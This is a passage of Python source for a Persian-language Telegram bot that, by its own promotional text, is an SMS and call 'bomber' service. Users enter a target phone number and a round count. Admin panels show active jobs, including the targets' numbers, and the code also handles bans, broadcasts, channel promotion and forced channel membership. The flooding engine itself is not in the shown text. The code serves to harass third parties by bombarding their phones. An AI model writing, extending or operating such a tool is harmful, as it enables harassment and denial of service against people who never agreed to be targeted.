        f"📱 شماره هدف را بفرست:\n"
        f"مثال: <code>09123456789</code>\n\n"
        f"🚫 برخی شماره‌ها خودکار مسدود هستند",
        reply_markup=kb_cancel_reply(),
    )
    await state.set_state(S.phone)


@router.message(F.text == "📊 آمار من")
async def menu_stats_me(m: Message):
    s = database.user_stats(m.from_user.id)
    u = database.get(m.from_user.id) or {}
    joined = u.get("joined_at", "")[:10]
    await m.answer(
        f"📊 <b>آمار شما</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📦 جاب‌ها: <b>{s['jobs']}</b>\n"
        f"✅ موفق: <b>{s['success']}</b>\n"
        f"❌ ناموفق: <b>{s['failed']}</b>\n\n"
        f"🆔 <code>{m.from_user.id}</code>\n"
        f"📅 عضویت: <b>{joined}</b>",
        reply_markup=kb_main_menu(m.from_user.id in ADMIN_IDS),
    )


@router.message(F.text == "🌐 آمار کلی")
async def menu_stats_global(m: Message):
    s = database.stats
    await m.answer(
        f"🌐 <b>آمار کلی</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👥 کاربران: <b>{s['total_users']}</b>\n"
        f"📦 جاب‌ها: <b>{s['total_jobs']}</b>\n"
        f"✅ موفق: <b>{s['total_success']}</b>\n"
        f"❌ ناموفق: <b>{s['total_failed']}</b>\n"
        f"🚫 مسدود: <b>{s['blocked_attempts']}</b>\n\n"
        f"🟢 فعال الان: <b>{len(ACTIVE)}</b>",
        reply_markup=kb_main_menu(m.from_user.id in ADMIN_IDS),
    )


@router.message(F.text == "📖 راهنما")
async def menu_help(m: Message):
    await m.answer(
        "📖 <b>راهنما</b>\n\n"
        "1️⃣ حالت را انتخاب کن\n"
        "2️⃣ شماره هدف را بفرست\n"
        "3️⃣ تعداد راند را وارد کن\n"
        "4️⃣ منتظر بمان\n\n"
        "🛑 با دکمه <b>توقف</b> می‌توانی متوقف کنی",
        reply_markup=kb_main_menu(m.from_user.id in ADMIN_IDS),
    )


@router.message(F.text == "📜 قوانین")
async def menu_rules(m: Message):
    await m.answer(
        RULES_TEXT,
        reply_markup=kb_main_menu(m.from_user.id in ADMIN_IDS),
    )


@router.message(F.text == "👑 پنل ادمین")
async def menu_admin(m: Message):
    if m.from_user.id not in ADMIN_IDS:
        return
    s = database.stats
    cfg = database.config
    join = "🟢 فعال" if cfg.get("force_join_enabled") else "🔴 غیرفعال"
    await m.answer(
        f"👑 <b>پنل ادمین</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👥 کاربران: <b>{s['total_users']}</b>\n"
        f"📦 جاب‌ها: <b>{s['total_jobs']}</b>\n"
        f"✅ موفق: <b>{s['total_success']}</b>\n"
        f"❌ ناموفق: <b>{s['total_failed']}</b>\n"
        f"🚫 مسدود: <b>{s['blocked_attempts']}</b>\n"
        f"⚡ فعال الان: <b>{len(ACTIVE)}</b>\n\n"
        f"📢 عضویت اجباری: {join}",
        reply_markup=kb_admin_inline(),
    )


# ============================================================
#                    CALLBACKS
# ============================================================
@router.callback_query(F.data == "accept_rules")
async def cb_accept_rules(q: CallbackQuery, state: FSMContext):
    await q.answer("✅ ثبت‌نام شدی")
    await database.accept_rules(q.from_user.id)
    log.info(f"📜 User {q.from_user.id} accepted rules")

    if not await check_membership(q.bot, q.from_user.id):
        cfg = database.config
        await q.message.edit_text(
            "📢 <b>عضویت اجباری</b>\n\n"
            "ابتدا در کانال عضو شوید:",
            reply_markup=kb_join(cfg.get("force_join_link", "")),
            disable_web_page_preview=True,
        )
        await state.set_state(S.join)
        return

    await q.message.edit_text(
        "🎉 <b>ثبت‌نام با موفقیت انجام شد!</b>\n\n"
        "🏠 از منوی زیر انتخاب کن:"
    )
    await q.message.answer(
        "👇 منوی اصلی:",
        reply_markup=kb_main_menu(q.from_user.id in ADMIN_IDS),
    )
    await state.set_state(S.menu)


@router.callback_query(F.data == "reject_rules")
async def cb_reject(q: CallbackQuery, state: FSMContext):
    await q.answer("❌ انصراف")
    await q.message.edit_text(
        "❌ برای استفاده از ربات باید قوانین را بپذیرید.\n\n"
        "🔄 برای تلاش مجدد /start را بزنید."
    )
    await state.clear()


@router.callback_query(F.data == "check_join")
async def cb_check_join(q: CallbackQuery, state: FSMContext):
    ok = await check_membership(q.bot, q.from_user.id)
    if not ok:
        await q.answer("❌ هنوز عضو نشده‌اید!", show_alert=True)
        return
    await q.answer("✅ عضویت تایید شد")
    await q.message.edit_text("✅ عضویت تایید شد!")
    await q.message.answer(
        "🏠 منوی اصلی:",
        reply_markup=kb_main_menu(q.from_user.id in ADMIN_IDS),
    )
    await state.set_state(S.menu)


@router.callback_query(F.data == "back_menu")
async def cb_back(q: CallbackQuery, state: FSMContext):
    await q.answer()
    if not await check_membership(q.bot, q.from_user.id):
        cfg = database.config
        await q.message.edit_text(
            "📢 ابتدا عضو کانال شوید:",
            reply_markup=kb_join(cfg.get("force_join_link", "")),
            disable_web_page_preview=True,
        )
        await state.set_state(S.join)
        return
    try:
        await q.message.edit_reply_markup(reply_markup=None)
    except Exception:
        pass
    await q.message.answer(
        "🏠 منوی اصلی:",
        reply_markup=kb_main_menu(q.from_user.id in ADMIN_IDS),
    )
    await state.set_state(S.menu)


# ---------------------- STOP / STATUS ----------------------
@router.callback_query(F.data.startswith("stop:"))
async def cb_stop(q: CallbackQuery):
    jid = q.data.split(":", 1)[1]
    runner = ACTIVE.get(q.from_user.id)
    if runner and runner.job_id == jid:
        runner.stop()
        await q.answer("🛑 درخواست توقف ارسال شد", show_alert=True)
        log.warning(f"🛑 Stop #{jid[-8:]} by {q.from_user.id}")
    else:
        await q.answer("جاب فعال نیست", show_alert=True)


@router.callback_query(F.data.startswith("status:"))
async def cb_status(q: CallbackQuery):
    runner = ACTIVE.get(q.from_user.id)
    if runner:
        await q.answer(
            f"🔁 {runner.rounds}/{runner.count}\n"
            f"✅ {runner.success} | ❌ {runner.failed}",
            show_alert=True,
        )
    else:
        await q.answer("جاب فعال نداری", show_alert=True)


# ============================================================
#                    👑 ADMIN CALLBACKS
# ============================================================
@router.callback_query(F.data == "a_post_channel")
async def cb_a_post_channel(q: CallbackQuery, state: FSMContext):
    if q.from_user.id not in ADMIN_IDS:
        await q.answer("⛔️", show_alert=True)
        return
    await q.answer()
    cfg = database.config
    if not cfg.get("force_join_channel_id"):
        await q.answer("❌ اول کانال را تنظیم کن", show_alert=True)
        return

    POST_DRAFT[q.from_user.id] = {"text": "", "buttons": []}
    await q.message.edit_text(
        f"📮 <b>ساخت پست برای کانال</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📢 کانال: <code>{cfg.get('force_join_channel', '-')}</code>\n\n"
        f"از دکمه‌های زیر استفاده کن:\n\n"
        f"✏️ متن پست رو بنویس\n"
        f"🔘 دکمه‌های شیشه‌ای (لینک) اضافه کن\n"
        f"📮 ارسال کن",
        reply_markup=kb_post_builder(False, 0),
    )
    await state.set_state(S.post_text)


@router.callback_query(F.data == "post_set_text")
async def cb_post_set_text(q: CallbackQuery, state: FSMContext):
    if q.from_user.id not in ADMIN_IDS:
        return
    await q.answer()
    await q.message.edit_text(
        "✏️ <b>متن پست</b>\n\n"
        "متن مورد نظر رو بفرست:\n"
        "(میتونی HTML استفاده کنی)\n\n"
        "برای انصراف /cancel",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="❌ انصراف", callback_data="post_cancel")]
        ]),
    )
    await state.set_state(S.post_text)


@router.message(S.post_text)
async def on_post_text(m: Message, state: FSMContext):
    if m.from_user.id not in ADMIN_IDS:
        await state.clear()
        return
    text = m.text or ""
    if not text:
        await m.answer("❌ متن خالی")
        return
    draft = POST_DRAFT.setdefault(m.from_user.id, {"text": "", "buttons": []})
    draft["text"] = text

    await m.answer(
        f"✅ متن ثبت شد\n\n"
        f"📝 <b>پیش‌نمایش:</b>\n{text}",
        reply_markup=kb_post_builder(True, len(draft["buttons"])),
    )
    await state.set_state(S.post_confirm)


@router.callback_query(F.data == "post_add_button")
async def cb_post_add_button(q: CallbackQuery, state: FSMContext):
    if q.from_user.id not in ADMIN_IDS:
        return
    await q.answer()
    await q.message.edit_text(
        "🔘 <b>افزودن دکمه شیشه‌ای</b>\n\n"
        "متن دکمه رو بفرست:\n"
        "مثال: <code>🚀 ورود به ربات</code>\n\n"
        "برای انصراف /cancel",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="❌ انصراف", callback_data="post_cancel")]
        ]),
    )
    await state.set_state(S.post_button_text)


@router.message(S.post_button_text)
async def on_post_btn_text(m: Message, state: FSMContext):
    if m.from_user.id not in ADMIN_IDS:
        await state.clear()
        return
    text = (m.text or "").strip()
    if not text:
        await m.answer("❌ متن خالی")
        return
    await state.update_data(btn_text=text)
    await m.answer(
        f"✅ متن دکمه: <b>{text}</b>\n\n"
        f"🔗 حالا لینک رو بفرست:\n"
        f"مثال: <code>https://t.me/YourBot</code>",
    )
    await state.set_state(S.post_button_url)


@router.message(S.post_button_url)
async def on_post_btn_url(m: Message, state: FSMContext):
    if m.from_user.id not in ADMIN_IDS:
        await state.clear()
        return
    url = (m.text or "").strip()
    if not (url.startswith("http://") or url.startswith("https://") or url.startswith("tg://")):
        await m.answer("❌ لینک نامعتبر. باید با http:// یا https:// شروع بشه")
        return

    data = await state.get_data()
    btn_text = data.get("btn_text", "لینک")

    draft = POST_DRAFT.setdefault(m.from_user.id, {"text": "", "buttons": []})
    draft["buttons"].append({"text": btn_text, "url": url})

    await m.answer(
        f"✅ دکمه اضافه شد: <b>{btn_text}</b> → {url}\n\n"
        f"📊 تعداد دکمه‌ها: <b>{len(draft['buttons'])}</b>",
        reply_markup=kb_post_builder(bool(draft["text"]), len(draft["buttons"])),
    )
    await state.set_state(S.post_confirm)


@router.callback_query(F.data == "post_clear_buttons")
async def cb_post_clear_buttons(q: CallbackQuery, state: FSMContext):
    if q.from_user.id not in ADMIN_IDS:
        return
    await q.answer("🗑 پاک شد")
    draft = POST_DRAFT.setdefault(q.from_user.id, {"text": "", "buttons": []})
    draft["buttons"] = []
    await q.message.edit_text(
        f"🗑 دکمه‌ها پاک شدند.\n\n"
        f"📝 متن: <b>{draft.get('text', '-')[:50]}</b>",
        reply_markup=kb_post_builder(bool(draft["text"]), 0),
    )
    await state.set_state(S.post_confirm)


@router.callback_query(F.data == "post_preview")
async def cb_post_preview(q: CallbackQuery, state: FSMContext):
    if q.from_user.id not in ADMIN_IDS:
        return
    await q.answer()
    draft = POST_DRAFT.get(q.from_user.id) or {"text": "", "buttons": []}
    kb = build_post_keyboard(draft["buttons"])
    text = draft["text"] or "⚠️ متنی وارد نشده"
    try:
        await q.message.edit_text(
            f"👁 <b>پیش‌نمایش پست:</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"{text}",
            reply_markup=kb,
        )
    except Exception as e:
        await q.answer(f"خطا: {e}", show_alert=True)
        return

    await q.message.answer(
        "⬆️ پیش‌نمایش بالا\n\n"
        "از دکمه‌های زیر برای ادامه استفاده کن:",
        reply_markup=kb_post_builder(bool(draft["text"]), len(draft["buttons"])),
    )
    await state.set_state(S.post_confirm)


@router.callback_query(F.data == "post_send")
async def cb_post_send(q: CallbackQuery, state: FSMContext):
    if q.from_user.id not in ADMIN_IDS:
        return
    draft = POST_DRAFT.get(q.from_user.id) or {"text": "", "buttons": []}
    if not draft["text"]:
        await q.answer("❌ اول متن پست رو بنویس", show_alert=True)
        return

    cfg = database.config
    ch_id = cfg.get("force_join_channel_id", 0)
    if not ch_id:
        await q.answer("❌ کانال تنظیم نشده", show_alert=True)
        return

    await q.answer("📮 در حال ارسال...")
    kb = build_post_keyboard(draft["buttons"])

    try:
        await q.bot.send_message(
            ch_id,
            draft["text"],
            reply_markup=kb,
            disable_web_page_preview=True,
        )
        log.info(f"📮 Post sent to channel {ch_id} by {q.from_user.id}")
        await q.message.edit_text(
            f"✅ <b>پست با موفقیت به کانال ارسال شد!</b>\n\n"
            f"📢 کانال: <code>{cfg.get('force_join_channel', '-')}</code>\n"
            f"🔘 تعداد دکمه‌ها: <b>{len(draft['buttons'])}</b>",
            reply_markup=kb_admin_inline(),
        )
    except Exception as e:
        log.error(f"❌ Send post failed: {e}")
        await q.message.edit_text(
            f"❌ <b>خطا در ارسال</b>\n\n"
            f"<code>{e}</code>\n\n"
            f"⚠️ مطمئن شو ربات در کانال ادمین هست.",
            reply_markup=kb_admin_inline(),
        )

    POST_DRAFT.pop(q.from_user.id, None)
    await state.clear()
    await state.set_state(S.menu)


@router.callback_query(F.data == "post_cancel")
async def cb_post_cancel(q: CallbackQuery, state: FSMContext):
    if q.from_user.id not in ADMIN_IDS:
        return
    await q.answer("❌ لغو")
    POST_DRAFT.pop(q.from_user.id, None)
    await q.message.edit_text(
        "❌ لغو شد.",
        reply_markup=kb_admin_inline(),
    )
    await state.clear()
    await state.set_state(S.menu)


# ---------------------- SEND BOT LINK TO CHANNEL ----------------------
@router.callback_query(F.data == "a_send_bot_link")
async def cb_a_send_bot_link(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        await q.answer("⛔️", show_alert=True)
        return
    await q.answer()

    cfg = database.config
    if not cfg.get("force_join_channel_id"):
        await q.answer("❌ اول کانال را تنظیم کن", show_alert=True)
        return

    me = await q.bot.get_me()
    bot_username = me.username
    database.config["bot_username"] = bot_username

    default_text = (
        f"🌵 <b>B2</b> 🌵\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔥 قوی‌ترین ربات بمبر ایرانی\n"
        f"📩 بمبر پیامک\n"
        f"📞 بمبر تماس\n"
        f"⚡️ سرعت بالا و پایدار\n\n"
        f"👇 برای ورود کلیک کن:"
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 ورود به ربات", url=f"https://t.me/{bot_username}")],
        [InlineKeyboardButton(text="📢 کانال ما", url=cfg.get("force_join_link") or f"https://t.me/{bot_username}")],
    ])

    try:
        await q.bot.send_message(
            cfg.get("force_join_channel_id"),
            default_text,
            reply_markup=kb,
            disable_web_page_preview=True,
        )
        log.info(f"🔗 Bot link sent to channel {cfg.get('force_join_channel_id')}")
        await q.message.edit_text(
            f"✅ <b>لینک ربات با دکمه‌های شیشه‌ای به کانال ارسال شد!</b>\n\n"
            f"📢 کانال: <code>{cfg.get('force_join_channel', '-')}</code>\n"
            f"🤖 ربات: @{bot_username}",
            reply_markup=kb_admin_inline(),
        )
    except Exception as e:
        log.error(f"❌ Send bot link failed: {e}")
        await q.message.edit_text(
            f"❌ <b>خطا</b>\n\n"
            f"<code>{e}</code>\n\n"
            f"⚠️ ربات رو در کانال ادمین کن.",
            reply_markup=kb_admin_inline(),
        )


# ---------------------- USERS LIST ----------------------
@router.callback_query(F.data == "a_users")
async def cb_a_users(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        await q.answer("⛔️", show_alert=True)
        return
    await q.answer()
    await _show_users_page(q, 0)


async def _show_users_page(q: CallbackQuery, page: int):
    users = list(database.users.values())
    users.sort(key=lambda u: u.get("joined_at", ""), reverse=True)
    per_page = 8
    total_pages = max(1, (len(users) + per_page - 1) // per_page)
    page = max(0, min(page, total_pages - 1))

    start = page * per_page
    chunk = users[start:start + per_page]

    banned = sum(1 for u in users if u.get("is_banned"))
    text = (
        f"👥 <b>کاربران ({len(users)})</b>\n"
        f"🚫 مسدود: <b>{banned}</b>\n"
        f"📄 صفحه <b>{page+1}/{total_pages}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
    )

    rows = []
    for u in chunk:
        ico = "🚫" if u.get("is_banned") else "✅"
        rules = "📜" if u.get("rules_accepted") else "❌"
        name = u.get("first_name", "?")[:15]
        uid = u["user_id"]
        label = f"{ico}{rules} {name} | {uid}"
        rows.append([InlineKeyboardButton(text=label, callback_data=f"uinfo:{uid}")])

    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton(text="◀️ قبلی", callback_data=f"u_page:{page-1}"))
    if page < total_pages - 1:
        nav.append(InlineKeyboardButton(text="بعدی ▶️", callback_data=f"u_page:{page+1}"))
    if nav:
        rows.append(nav)
    rows.append([InlineKeyboardButton(text="🔍 جستجو", callback_data="a_search")])
    rows.append([InlineKeyboardButton(text="◀️ بازگشت", callback_data="admin_panel")])

    kb = InlineKeyboardMarkup(inline_keyboard=rows)
    try:
        await q.message.edit_text(text, reply_markup=kb)
    except TelegramBadRequest:
        pass


@router.callback_query(F.data.startswith("u_page:"))
async def cb_u_page(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        await q.answer("⛔️", show_alert=True)
        return
    await q.answer()
    page = int(q.data.split(":")[1])
    await _show_users_page(q, page)


@router.callback_query(F.data.startswith("uinfo:"))
async def cb_uinfo(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        await q.answer("⛔️", show_alert=True)
        return
    await q.answer()
    uid = int(q.data.split(":")[1])
    u = database.get(uid)
    if not u:
        await q.answer("کاربر یافت نشد", show_alert=True)
        return

    text = (
        f"👤 <b>اطلاعات کاربر</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🆔 <code>{u['user_id']}</code>\n"
        f"👤 نام: <b>{u.get('first_name', '?')}</b>\n"
        f"📛 یوزرنیم: @{u.get('username', '-')}\n"
        f"📅 عضویت: <b>{u.get('joined_at', '')[:10]}</b>\n\n"
        f"📜 قوانین: {'✅' if u.get('rules_accepted') else '❌'}\n"
        f"🚫 بن: {'✅' if u.get('is_banned') else '❌'}\n\n"
        f"📦 جاب‌ها: <b>{u.get('total_jobs', 0)}</b>\n"
        f"✅ موفق: <b>{u.get('total_success', 0)}</b>\n"
        f"❌ ناموفق: <b>{u.get('total_failed', 0)}</b>"
    )
    await q.message.edit_text(text, reply_markup=kb_user_manage(uid, u.get("is_banned", False)))


@router.callback_query(F.data.startswith("ban:"))
async def cb_ban(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        await q.answer("⛔️", show_alert=True)
        return
    uid = int(q.data.split(":")[1])
    await database.set_banned(uid, True)
    await q.answer("🚫 کاربر بن شد", show_alert=True)
    log.warning(f"🚫 User {uid} BANNED by {q.from_user.id}")
    await cb_uinfo(q)


@router.callback_query(F.data.startswith("unban:"))
async def cb_unban(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        await q.answer("⛔️", show_alert=True)
        return
    uid = int(q.data.split(":")[1])
    await database.set_banned(uid, False)
    await q.answer("✅ کاربر آنبن شد", show_alert=True)
    log.info(f"✅ User {uid} UNBANNED by {q.from_user.id}")
    await cb_uinfo(q)


# ---------------------- MSG TO USER ----------------------
@router.callback_query(F.data.startswith("msg:"))
async def cb_msg_user(q: CallbackQuery, state: FSMContext):
    if q.from_user.id not in ADMIN_IDS:
        await q.answer("⛔️", show_alert=True)
        return
    uid = int(q.data.split(":")[1])
    await q.answer()
    await state.update_data(target_uid=uid)
    await q.message.edit_text(
        f"✉️ <b>ارسال پیام به کاربر</b>\n\n"
        f"🆔 <code>{uid}</code>\n\n"
        f"متن پیام را بفرست:\n"
        f"(/cancel برای انصراف)",
    )
    await state.set_state(S.admin_msg_user)


@router.callback_query(F.data == "a_msg_user")
async def cb_a_msg_user(q: CallbackQuery, state: FSMContext):
    if q.from_user.id not in ADMIN_IDS:
        await q.answer("⛔️", show_alert=True)
        return
    await q.answer()
    await q.message.edit_text(
        "✉️ <b>ارسال پیام به کاربر خاص</b>\n\n"
        "آیدی عددی کاربر را بفرست:\n"
        "(/cancel برای انصراف)",
    )
    await state.update_data(target_uid=None)
    await state.set_state(S.admin_msg_user)


@router.message(S.admin_msg_user)
async def on_admin_msg(m: Message, state: FSMContext):
    if m.from_user.id not in ADMIN_IDS:
        await state.clear()
        return

    data = await state.get_data()
    target = data.get("target_uid")
    text = m.text or ""

    if target is None:
        if not text.isdigit():
            await m.answer("❌ آیدی عددی نامعتبر")
            return
        target = int(text)
        await state.update_data(target_uid=target)
        await m.answer(f"✅ آیدی: <code>{target}</code>\n\nحالا متن پیام را بفرست:")
        return

    if not text:
        await m.answer("❌ متن خالی")
        return

    try:
        await m.bot.send_message(target, f"📩 <b>پیام از ادمین:</b>\n\n{text}")
        await m.answer(f"✅ پیام ارسال شد به <code>{target}</code>",
                       reply_markup=kb_admin_inline())
    except Exception as e:
        await m.answer(f"❌ خطا: {e}", reply_markup=kb_admin_inline())

    await state.clear()
    await state.set_state(S.menu)


# ---------------------- SEARCH ----------------------
@router.callback_query(F.data == "a_search")
async def cb_a_search(q: CallbackQuery, state: FSMContext):
    if q.from_user.id not in ADMIN_IDS:
        await q.answer("⛔️", show_alert=True)
        return
    await q.answer()
    await q.message.edit_text(
        "🔍 <b>جستجوی کاربر</b>\n\n"
        "آیدی، یوزرنیم یا نام را بفرست:\n"
        "(/cancel برای انصراف)",
    )
    await state.set_state(S.admin_search)


@router.message(S.admin_search)
async def on_admin_search(m: Message, state: FSMContext):
    if m.from_user.id not in ADMIN_IDS:
        await state.clear()
        return

    q = (m.text or "").strip().lower()
    if not q:
        await m.answer("❌ خالی")
        return

    results = []
    for u in database.users.values():
        if (q in str(u.get("user_id", "")) or
                q in (u.get("username", "") or "").lower() or
                q in (u.get("first_name", "") or "").lower()):
            results.append(u)
        if len(results) >= 10:
            break

    if not results:
        await m.answer("❌ نتیجه‌ای یافت نشد", reply_markup=kb_admin_inline())
        await state.clear()
        await state.set_state(S.menu)
        return

    rows = []
    for u in results:
        ico = "🚫" if u.get("is_banned") else "✅"
        label = f"{ico} {u.get('first_name','?')[:15]} | {u['user_id']}"
        rows.append([InlineKeyboardButton(text=label, callback_data=f"uinfo:{u['user_id']}")])
    rows.append([InlineKeyboardButton(text="◀️ بازگشت", callback_data="admin_panel")])

    await m.answer(
        f"🔍 <b>نتایج ({len(results)})</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
    )
    await state.clear()
    await state.set_state(S.menu)


# ---------------------- ACTIVE JOBS ----------------------
@router.callback_query(F.data == "a_active")
async def cb_a_active(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        await q.answer("⛔️", show_alert=True)
        return
    await q.answer()
    if not ACTIVE:
        await q.message.edit_text("📦 جاب فعالی نیست.", reply_markup=kb_admin_inline())
        return
    text = "📦 <b>جاب‌های فعال</b>\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    for uid, r in ACTIVE.items():
        pct = int((r.rounds / r.count) * 100) if r.count else 0
        bar = "█" * (pct // 10) + "░" * (10 - pct // 10)
        text += (
            f"🆔 <code>{uid}</code>\n"
            f"🎯 <code>{r.phone}</code>\n"
            f"🎛 {r.mode}\n"
            f"<code>{bar}</code> {pct}%\n"
            f"🔁 {r.rounds}/{r.count} | ✅ {r.success} | ❌ {r.failed}\n\n"
        )
    await q.message.edit_text(text, reply_markup=kb_admin_inline())


# ---------------------- LIVE STATS ----------------------
@router.callback_query(F.data == "a_live")
async def cb_a_live(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        await q.answer("⛔️", show_alert=True)
        return
    await q.answer("📊 آمار لحظه‌ای")
    s = database.stats
    total = s['total_success'] + s['total_failed']
    rate = int((s['total_success'] / total) * 100) if total else 0
    bar = "█" * (rate // 10) + "░" * (10 - rate // 10)

    await q.message.edit_text(
        f"📊 <b>آمار زنده</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👥 کاربران: <b>{s['total_users']}</b>\n"
        f"📦 کل جاب‌ها: <b>{s['total_jobs']}</b>\n"
        f"⚡ فعال الان: <b>{len(ACTIVE)}</b>\n\n"
        f"✅ موفق: <b>{s['total_success']}</b>\n"
        f"❌ ناموفق: <b>{s['total_failed']}</b>\n"
        f"🎯 نرخ موفقیت:\n"
        f"<code>{bar}</code> {rate}%\n\n"
        f"🚫 تلاش‌های مسدود: <b>{s['blocked_attempts']}</b>",
        reply_markup=kb_admin_inline(),
    )


# ---------------------- BROADCAST ----------------------
@router.callback_query(F.data == "a_broadcast")
async def cb_a_broadcast(q: CallbackQuery, state: FSMContext):
    if q.from_user.id not in ADMIN_IDS:
        await q.answer("⛔️", show_alert=True)
        return
    await q.answer()
    await q.message.edit_text(
        "📢 <b>پیام همگانی</b>\n\n"
        "متن پیام را بفرست:\n"
        "(برای انصراف /cancel)",
    )
    await state.set_state(S.broadcast)


@router.message(S.broadcast)
async def on_broadcast(m: Message, state: FSMContext):
    if m.from_user.id not in ADMIN_IDS:
        await state.clear()
        return

    text = m.text or ""
    if not text:
        await m.answer("❌ متن خالی است")
        return

    users = [uid for uid in database.all_ids() if not database.is_banned(uid)]
    sent, fail = 0, 0
    status = await m.answer(f"📢 شروع ارسال به {len(users)} کاربر...")

    for uid in users:
        try:
            await m.bot.send_message(uid, text)
            sent += 1
            if sent % 25 == 0:
                try:
                    await status.edit_text(
                        f"📢 <b>در حال ارسال...</b>\n\n"
                        f"✅ {sent}/{len(users)}\n"
                        f"❌ {fail}"
                    )
                except Exception:
                    pass
            await asyncio.sleep(0.05)
        except Exception:
            fail += 1

    await status.edit_text(
        f"✅ <b>پیام همگانی ارسال شد</b>\n\n"
        f"📨 ارسال: <b>{sent}</b>\n"
        f"❌ ناموفق: <b>{fail}</b>",
        reply_markup=kb_admin_inline(),
    )
    log.info(f"📢 Broadcast: {sent} sent, {fail} failed")
    await state.clear()
    await state.set_state(S.menu)


# ---------------------- CHANNEL SETTINGS ----------------------
@router.callback_query(F.data == "a_set_channel")
async def cb_a_set_channel(q: CallbackQuery, state: FSMContext):
    if q.from_user.id not in ADMIN_IDS:
        await q.answer("⛔️", show_alert=True)
        return
    await q.answer()
    cfg = database.config
    await q.message.edit_text(
        f"⚙️ <b>تنظیم کانال اجباری</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📢 کانال فعلی: <code>{cfg.get('force_join_channel', '-')}</code>\n"
        f"🆔 آیدی عددی: <code>{cfg.get('force_join_channel_id', '-')}</code>\n"
        f"🔗 لینک: {cfg.get('force_join_link', '-')}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"ارسال کنید به فرمت:\n"
        f"<code>@channel|https://t.me/channel</code>\n\n"
        f"یا برای کانال خصوصی:\n"
        f"<code>-1001234567890|https://t.me/+abc</code>\n\n"
        f"(/cancel برای انصراف)",
    )
    await state.set_state(S.set_channel)


@router.message(S.set_channel)
async def on_set_channel(m: Message, state: FSMContext):
    if m.from_user.id not in ADMIN_IDS:
        await state.clear()
        return

    text = (m.text or "").strip()
    if "|" not in text:
        await m.answer("❌ فرمت نامعتبر. مثال:\n<code>@channel|https://t.me/channel</code>")
        return

    ch, link = text.split("|", 1)
    ch = ch.strip()
    link = link.strip()

    ch_id = 0
    if ch.startswith("-100") and ch[1:].isdigit():
        ch_id = int(ch)
    elif ch.startswith("@"):
        try:
            chat = await m.bot.get_chat(ch)
            ch_id = chat.id
        except Exception as e:
            await m.answer(f"❌ خطا در یافتن کانال: {e}")
            return
    else:
        await m.answer("❌ فرمت آیدی نامعتبر")
        return

    await database.set_config(
        force_join_channel=ch,
        force_join_channel_id=ch_id,
        force_join_link=link,
    )
    await m.answer(
        f"✅ <b>کانال تنظیم شد</b>\n\n"
        f"📢 {ch}\n"
        f"🆔 {ch_id}\n"
        f"🔗 {link}\n\n"
        f"⚠️ ربات را در کانال ادمین کنید.",
        reply_markup=kb_admin_inline(),
    )
    log.info(f"📢 Channel set: {ch} ({ch_id})")
    await state.clear()
    await state.set_state(S.menu)


@router.callback_query(F.data == "a_join_on")
async def cb_join_on(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        await q.answer("⛔️", show_alert=True)
        return
    cfg = database.config
    if not cfg.get("force_join_channel_id"):
        await q.answer("❌ اول کانال را تنظیم کن", show_alert=True)
        return
    await database.set_config(force_join_enabled=True)
    await q.answer("✅ عضویت اجباری فعال شد", show_alert=True)
    log.info("📢 Force join ENABLED")


@router.callback_query(F.data == "a_join_off")
async def cb_join_off(q: CallbackQuery):
    if q.from_user.id not in ADMIN_IDS:
        await q.answer("⛔️", show_alert=True)
        return
    await database.set_config(force_join_enabled=False)
    await q.answer("🔒 عضویت اجباری غیرفعال شد", show_alert=True)
    log.info("🔒 Force join DISABLED")


# ============================================================
#                    PHONE INPUT
# ============================================================
@router.message(S.phone, F.text)
async def on_phone(m: Message, state: FSMContext):
    text = (m.text or "").strip()
    if not valid_phone(text):
        await m.answer(
            "❌ شماره نامعتبر. مثال:\n<code>09123456789</code>",
            reply_markup=kb_cancel_reply(),
        )
        return

    phone = norm(text)

    if is_forbidden(phone):
        await database.log_blocked(m.from_user.id)
        await m.answer(
            "🚫 <b>دسترسی مسدود!</b>\n\n"
            "این شماره محافظت‌شده است.\n"
            "⚠️ تکرار = بن",
            reply_markup=kb_main_menu(m.from_user.id in ADMIN_IDS),
        )
        await state.clear()
        await state.set_state(S.menu)
        return

    await state.update_data(phone=phone)
    await m.answer(
        f"✅ شماره: <code>{phone}</code>\n\n"
        f"🔢 تعداد راند؟ (1-{MAX_REQUESTS_PER_JOB})",
        reply_markup=kb_cancel_reply(),
    )
    await state.set_state(S.count)


# ============================================================
#                    COUNT + RUN
# ============================================================
@router.message(S.count, F.text)
async def on_count(m: Message, state: FSMContext):
    text = (m.text or "").strip()
    if not text.isdigit():
        await m.answer("❌ فقط عدد.", reply_markup=kb_cancel_reply())
        return

    count = int(text)
    if not (1 <= count <= MAX_REQUESTS_PER_JOB):
        await m.answer(f"❌ بین 1 و {MAX_REQUESTS_PER_JOB}.",
                       reply_markup=kb_cancel_reply())
        return

    data = await state.get_data()
    phone = data.get("phone")
    mode = data.get("mode")
    if not phone or not mode:
